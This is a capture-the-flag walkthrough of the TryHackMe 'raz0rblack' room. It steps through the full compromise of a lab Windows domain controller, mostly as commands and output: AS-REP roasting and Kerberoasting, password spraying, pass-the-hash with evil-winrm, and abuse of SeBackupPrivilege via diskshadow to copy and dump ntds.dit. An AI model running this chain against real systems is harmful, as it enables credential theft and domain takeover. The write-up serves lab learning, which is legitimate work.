# raz0rblack

https://tryhackme.com/room/raz0rblack

A multi-stage room, a bit hard.

01. Enum showed standard windows ports, and a domain (raz0rblack.thm) 
02. i used to enumerate the domain: root@kali$crackmapexec smb 10.10.73.116
03. Enum NFS
    root@kali$ showmount -e 10.10.73.116
    Export list for 10.10.73.116:
    /users (everyone)
    root@kali$ mkdir users
    root@kali$ mount -t nfs -o vers=2 10.10.73.116:/users ./users
    root@kali$ cd users
    root@kali$ ls
    employee_status.xlsx  sbradley.txt
    Extracted usernames from the xlsx file and create file users.txt (format used like sbradley)
04. root@kali$ python3 /opt/impacket/examples/GetNPUsers.py 'raz0rblack.thm/' -usersfile users.txt -no-pass -dc-ip 10.10.209.59 -format hashcat -outputfile hashes.asreproast.txt
    cracked the hash with E:\PENTEST\hashcat>hashcat32.exe -m 18200 hashes.asreproast.txt rockyou.txt --force
05. Testing new creds on SMB
    root@kali$ smbmap -H 10.10.73.116 -u twilliams -p password
06. bruteforce usernames
   root@kali$ crackmapexec smb 10.10.73.116 -u 'twilliams' -p 'password' --rid-brute
07. Test if p password is reused
   root@kali$ crackmapexec smb 10.10.73.116 -u users.txt -p pass.txt
   SMB         10.10.73.116    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
   SMB         10.10.73.116    445    HAVEN-DC         [-] raz0rblack.thm\xyan1d3:password STATUS_LOGON_FAILURE
   SMB         10.10.73.116    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:password STATUS_LOGON_FAILURE
   SMB         10.10.73.116    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:password STATUS_PASSWORD_MUST_CHANGE
08  change the password of sbradley
   root@kali$ smbpasswd -r 10.10.16.174 -U sbradley
   Old SMB password: password
   New SMB password: Puckie123!
   Retype new SMB password: Puckie123!
   Password changed for user sbradley on 10.10.16.174
09. Enumerate SMB with new password
   root@kali$ smbmap -H 10.10.73.116 -u sbradley -p 'Puckie123!'
   [+] IP: 10.10.16.174:445        Name: 10.10.73.116
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        trash                                                   READ ONLY       Files Pending for deletion

   root@kali$ smbclient //10.10.73.116/trash --user='sbradley%Puckie123!'
   Try "help" to get a list of possible commands.
   smb: \> dir
  .                                   D        0  Tue Mar 16 02:01:28 2021
  ..                                  D        0  Tue Mar 16 02:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 14:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 02:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 14:24:21 2021
  smb: \> mget *
10. Crack the zip
   root@kali$ zip2john experiment_gone_wrong.zip > hash
   root@kali$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
   root@kali$ unzip experiment_gone_wrong.zip
   Archive:  experiment_gone_wrong.zip
   [experiment_gone_wrong.zip] system.hive password: password
   inflating: system.hive
   inflating: ntds.dit
11. Find the hash of lvetrova and login
    root@kali$ evil-winrm -i 10.10.73.116 -u lvetrova -H hash
12. Kerberoasting with pass-the-hash with lvetrova creds
    root@kali$ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.168.132 raz0rblack.thm/lvetrova -hashes hash:hash -outputfile hashes.kerberoast

   ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
   -------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
   HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>

   E:\PENTEST\hashcat>hashcat32.exe -m 13100 hashes.kerberoast.txt rockyou.txt --force
   finds cracked password: password
   root@kali$ evil-winrm -i 10.10.73.116 -u xyan1d3 -p password
13. PrivEsc
    *Evil-WinRM* PS C:\Users\xyan1d3> whoami /all

[...]

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
Abuse Backup Privs (important: diskshadow.txt has a space after each line):

root@kali$ cat diskshadow.txt
set metadata C:\tmp\tmp.cabs 
set context persistent nowriters 
add volume c: alias someAlias 
create 
expose %someAlias% h: 

*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp 
*Evil-WinRM* PS C:\tmp> upload diskshadow.txt

*Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC,  7/16/2021 3:45:19 PM

-> set metadata C:\tmp\tmp.cabs
-> set context persistent nowriters
-> add volume c: alias someAlias
-> create
Alias someAlias for shadow ID {29b531e8-3c00-49f9-925d-5e1e3937af13} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} set as environment variable.

Querying all shadow copies with the shadow copy set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}

        * Shadow copy ID = {29b531e8-3c00-49f9-925d-5e1e3937af13}               %someAlias%
                - Shadow copy set: {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/16/2021 3:45:20 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: HAVEN-DC.raz0rblack.thm
                - Service machine: HAVEN-DC.raz0rblack.thm
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% h:
-> %someAlias% = {29b531e8-3c00-49f9-925d-5e1e3937af13}
The shadow copy was successfully exposed as h:\.
Get dll???s to abuse Backup Privs:

root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
Upload, import, abuse:

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite

*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system

*Evil-WinRM* PS C:\tmp> download ntds.dit

*Evil-WinRM* PS C:\tmp> download system
Dump the hashes:

root@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL

root@kali$ evil-winrm -i 10.10.73.116 -u administrator -H hash

*Evil-WinRM* PS C:\users\administrator\Documents> 


Tools used:

- impacket
- kerbrute: https://github.com/ropnop/kerbrute
- evil-winrm
- hacktricks for guides on privileges: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
- https://github.com/giuliano108/SeBackupPrivilege
